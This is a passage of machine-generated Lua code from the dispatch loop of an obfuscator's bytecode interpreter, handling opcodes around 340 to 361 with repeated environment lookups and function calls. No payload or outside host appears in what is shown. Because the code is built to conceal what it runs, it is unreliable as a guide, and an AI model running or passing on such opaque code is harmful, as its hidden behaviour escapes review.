            elseif (Enum <= 340) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3] ~= 0;
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 341) then
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            else
              Env[Inst[3]] = Stk[Inst[2]];
            end
          elseif (Enum <= 345) then
            if (Enum <= 343) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
            elseif (Enum == 344) then
              local Results;
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Stk[A + 1]));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results = {Stk[A](Unpack(Stk, A + 1, Top))};
              Edx = 0;
              for Idx = A, Inst[4] do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              VIP = Inst[3];
            else
              local B;
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
            end
          elseif (Enum <= 347) then
            if (Enum > 346) then
              local B;
              local T;
              local A;
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              T = Stk[A];
              B = Inst[3];
              for Idx = 1, B do
                T[Idx] = Stk[A + Idx];
              end
            else
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum > 348) then
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          else
            Stk[Inst[2]] = Stk[Inst[3]];
          end
        elseif (Enum <= 374) then
          if (Enum <= 361) then
            if (Enum <= 355) then
              if (Enum <= 352) then
                if (Enum <= 350) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                elseif (Enum > 351) then
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 353) then
                local A = Inst[2];
                local Results, Limit = _R(Stk[A](Stk[A + 1]));
                Top = (Limit + A) - 1;
                local Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
              elseif (Enum == 354) then
                local Edx;
                local Results, Limit;
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Stk[A + 1]);
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3] ~= 0;
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = {};
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]][Inst[3]] = Inst[4];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                Top = (Limit + A) - 1;
                Edx = 0;
                for Idx = A, Top do
                  Edx = Edx + 1;
                  Stk[Idx] = Results[Edx];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]]();
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              else
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              end
            elseif (Enum <= 358) then
              if (Enum <= 356) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                do
                  return;
                end
              elseif (Enum > 357) then
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
              else
                local B;
                local A;
                if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                  Stk[Inst[2]] = Env;
                else
                  Stk[Inst[2]] = Env[Inst[3]];
                end
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                B = Stk[Inst[3]];
                Stk[A + 1] = B;
                Stk[A] = B[Inst[4]];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                Stk[Inst[2]] = Inst[3];
                VIP = VIP + 1;
                Inst = Instr[VIP];
                A = Inst[2];
                Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              end
            elseif (Enum <= 359) then
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = {};
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]][Inst[3]] = Inst[4];
            elseif (Enum > 360) then
              local A;
              A = Inst[2];
              Stk[A](Unpack(Stk, A + 1, Inst[3]));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Stk[A + 1]);
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
